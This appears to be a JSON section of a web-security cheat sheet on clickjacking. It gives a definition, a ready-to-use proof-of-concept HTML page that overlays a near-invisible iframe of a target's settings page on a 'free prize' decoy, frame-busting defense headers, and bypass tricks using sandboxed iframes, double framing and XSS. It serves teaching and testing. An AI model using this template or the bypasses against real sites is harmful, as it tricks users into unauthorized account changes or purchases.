    "sections": [
        {
            "type": "hint",
            "variant": "info",
            "content": "Clickjacking (UI Redressing) is an interface-based attack where a user is tricked into clicking on actionable content on a hidden website by clicking on decoy content. \n\n**Impact:** Unauthorized actions such as deleting accounts, making purchases, or changing security settings without the user's knowledge."
        },
        {
            "heading": "PoC Template",
            "type": "code_block",
            "content": [
                "<html>",
                "    <head>",
                "        <style>",
                "            #targetwebsite {",
                "                position: relative;",
                "                width: 1280px;",
                "                height: 720px;",
                "                opacity: 0.1; /* Set to 0.00001 for real attack */",
                "                z-index: 2;",
                "            }",
                "            #decoywebsite {",
                "                position: absolute;",
                "                width: 300px;",
                "                height: 400px;",
                "                z-index: 1;",
                "            }",
                "        </style>",
                "    </head>",
                "    <body>",
                "        <div id=\"decoywebsite\">",
                "            <h1>Click here for a free prize!</h1>",
                "        </div>",
                "        <iframe id=\"targetwebsite\" src=\"https://vulnerable-website.com/settings\"></iframe>",
                "    </body>",
                "</html>"
            ]
        },
        {
            "heading": "Defense Mechanisms",
            "type": "code_block",
            "content": [
                "# 1. X-Frame-Options (XFO)",
                "X-Frame-Options: DENY          # Cannot be framed by anyone",
                "X-Frame-Options: SAMEORIGIN    # Can only be framed by same origin",
                "",
                "# 2. Content Security Policy (CSP)",
                "Content-Security-Policy: frame-ancestors 'none';           # Equivalent to DENY",
                "Content-Security-Policy: frame-ancestors 'self';           # Equivalent to SAMEORIGIN",
                "Content-Security-Policy: frame-ancestors 'self' *.trusted.com;",
                "",
                "# 3. SameSite Cookie Attribute",
                "Set-Cookie: session=xyz; SameSite=Lax;     # Prevents cookie being sent in cross-site frames",
                "Set-Cookie: session=xyz; SameSite=Strict;  # Most secure against clickjacking"
            ]
        },
        {
            "heading": "Bypassing Frame-Busters",
            "type": "code_block",
            "content": [
                "# HTML5 Sandbox attribute bypass",
                "<iframe sandbox=\"allow-forms\" src=\"...\"></iframe>",
                "",
                "# Double-framing technique",
                "# Attacker -> Decoy (unrestricted) -> Vulnerable (restricted)",
                "",
                "# XSS to Clickjacking",
                "# If the site has XSS, you can use it to remove frame-busting scripts dynamically."
            ]
        }
    ],
